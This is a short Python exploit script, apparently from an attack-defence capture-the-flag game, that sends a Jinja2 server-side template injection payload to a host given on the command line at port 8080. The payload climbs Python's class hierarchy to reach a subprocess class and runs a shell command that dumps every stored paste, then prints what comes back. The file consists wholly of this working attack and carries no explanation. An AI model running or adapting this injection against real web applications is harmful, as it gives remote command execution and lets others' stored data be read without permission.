#!/usr/bin/env python3

import requests as req
import sys

spl = r"{{''.__class__.__mro__[1].__subclasses__()[359]('cat pastes/*', shell=True, stdout=-1).communicate()}}"

host = sys.argv[1]
payload = {"content" : spl}

try:
	r = req.post("http://%s:8080/" % host, data=payload, timeout=5)
	print(r.text, flush=True)
except req.exceptions.Timeout:
	print("Timeout", flush=True)
